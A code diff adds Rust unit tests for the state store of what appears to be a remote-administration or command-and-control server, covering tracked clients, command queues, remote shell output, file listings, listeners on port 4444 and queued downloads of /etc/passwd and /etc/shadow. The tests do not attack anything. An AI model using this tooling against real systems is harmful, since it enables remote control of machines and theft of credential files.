@@ -369,3 +369,202 @@ impl Default for AppState {
 
 /// 全局状态实例
 pub type SharedState = Arc<AppState>;
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use shared::messages::ClientIdentification;
+
+    fn make_test_state() -> AppState {
+        // 不使用数据库的纯内存状态
+        AppState {
+            clients: RwLock::new(HashMap::new()),
+            listeners: RwLock::new(HashMap::new()),
+            pending_commands: RwLock::new(HashMap::new()),
+            shell_responses: RwLock::new(HashMap::new()),
+            file_responses: RwLock::new(HashMap::new()),
+            pending_downloads: RwLock::new(HashMap::new()),
+            listener_shutdown: RwLock::new(HashMap::new()),
+            db: None,
+        }
+    }
+
+    fn make_test_client(id: &str) -> ConnectedClient {
+        let info = ClientIdentification {
+            id: id.to_string(),
+            version: "1.0".to_string(),
+            operating_system: "Windows 10".to_string(),
+            account_type: "Admin".to_string(),
+            country: "CN".to_string(),
+            username: "test".to_string(),
+            pc_name: "PC-TEST".to_string(),
+            tag: "default".to_string(),
+        };
+        ConnectedClient::from_identification(info, "192.168.1.1".to_string())
+    }
+
+    #[test]
+    fn test_client_crud() {
+        let state = make_test_state();
+        
+        // 添加
+        state.add_client(make_test_client("c1"));
+        state.add_client(make_test_client("c2"));
+        assert_eq!(state.get_clients().len(), 2);
+        
+        // 移除
+        state.remove_client("c1");
+        assert_eq!(state.get_clients().len(), 1);
+        assert_eq!(state.get_clients()[0].id, "c2");
+    }
+
+    #[test]
+    fn test_update_last_seen() {
+        let state = make_test_state();
+        let client = make_test_client("c1");
+        let original_time = client.last_seen;
+        state.add_client(client);
+        
+        // 等一小段时间再更新
+        std::thread::sleep(std::time::Duration::from_millis(10));
+        state.update_last_seen("c1");
+        
+        let clients = state.get_clients();
+        assert!(clients[0].last_seen >= original_time);
+    }
+
+    #[test]
+    fn test_command_queue() {
+        let state = make_test_state();
+        
+        state.push_command("c1", vec![1, 2, 3]);
+        state.push_command("c1", vec![4, 5, 6]);
+        state.push_command("c2", vec![7, 8, 9]);
+        
+        let c1_cmds = state.take_pending_commands("c1");
+        assert_eq!(c1_cmds.len(), 2);
+        assert_eq!(c1_cmds[0], vec![1, 2, 3]);
+        assert_eq!(c1_cmds[1], vec![4, 5, 6]);
+        
+        // take 后队列应为空
+        assert!(state.take_pending_commands("c1").is_empty());
+        
+        // c2 的队列不受影响
+        assert_eq!(state.take_pending_commands("c2").len(), 1);
+    }
+
+    #[test]
+    fn test_shell_responses() {
+        let state = make_test_state();
+        
+        state.add_shell_response(ShellResponse {
+            client_id: "c1".to_string(),
+            output: "hello".to_string(),
+            is_error: false,
+            timestamp: 100,
+        });
+        state.add_shell_response(ShellResponse {
+            client_id: "c1".to_string(),
+            output: "world".to_string(),
+            is_error: false,
+            timestamp: 200,
+        });
+        
+        let responses = state.take_shell_responses("c1");
+        assert_eq!(responses.len(), 2);
+        assert_eq!(responses[0].output, "hello");
+        
+        // take 后应为空
+        assert!(state.take_shell_responses("c1").is_empty());
+        
+        // 不存在的 client_id 返回空
+        assert!(state.take_shell_responses("nonexistent").is_empty());
+    }
+
+    #[test]
+    fn test_file_responses() {
+        let state = make_test_state();
+        
+        state.add_file_response("c1", FileResponse::DirectoryListing {
+            path: "/tmp".to_string(),
+            entries: vec![],
+            error: None,
+        });
+        
+        let responses = state.take_file_responses("c1");
+        assert_eq!(responses.len(), 1);
+        assert!(state.take_file_responses("c1").is_empty());
+    }
+
+    #[test]
+    fn test_pending_downloads() {
+        let state = make_test_state();
+        
+        state.add_pending_download("c1", "/etc/passwd".to_string());
+        state.add_pending_download("c1", "/etc/shadow".to_string());
+        
+        // FIFO 顺序
+        assert_eq!(state.take_pending_download("c1"), Some("/etc/passwd".to_string()));
+        assert_eq!(state.take_pending_download("c1"), Some("/etc/shadow".to_string()));
+        assert_eq!(state.take_pending_download("c1"), None);
+    }
+
+    #[test]
+    fn test_listener_crud() {
+        let state = make_test_state();
+        
+        let listener = ListenerConfig {
+            id: "l1".to_string(),
+            name: "Test Listener".to_string(),
+            bind_address: "0.0.0.0".to_string(),
+            port: 4444,
+            is_running: false,
+            encryption_key: "a".repeat(64),
+        };
+        state.add_listener(listener);
+        
+        assert_eq!(state.get_listeners().len(), 1);
+        assert_eq!(state.get_listeners()[0].name, "Test Listener");
+        
+        state.update_listener_status("l1", true);
+        assert!(state.get_listeners()[0].is_running);
+        
+        state.delete_listener("l1");
+        assert!(state.get_listeners().is_empty());
+    }
+
+    #[test]
+    fn test_get_current_encryption_key() {
+        let state = make_test_state();
+        
+        // 没有监听器时返回空
+        assert!(state.get_current_encryption_key().is_empty());
+        
+        // 有监听器但未运行
+        state.add_listener(ListenerConfig {
+            id: "l1".to_string(),
+            name: "L1".to_string(),
+            bind_address: "0.0.0.0".to_string(),
+            port: 4444,
+            is_running: false,
+            encryption_key: "key_stopped".to_string(),
+        });
+        assert!(state.get_current_encryption_key().is_empty());
+        
+        // 启动后返回密钥
+        state.update_listener_status("l1", true);
+        assert_eq!(state.get_current_encryption_key(), "key_stopped");
+    }
+
+    #[test]
+    fn test_remove_client_cleans_commands() {
+        let state = make_test_state();
+        state.add_client(make_test_client("c1"));
+        state.push_command("c1", vec![1, 2, 3]);
+        
+        state.remove_client("c1");
+        
+        // 命令队列也应被清理
+        assert!(state.take_pending_commands("c1").is_empty());
+    }
+}
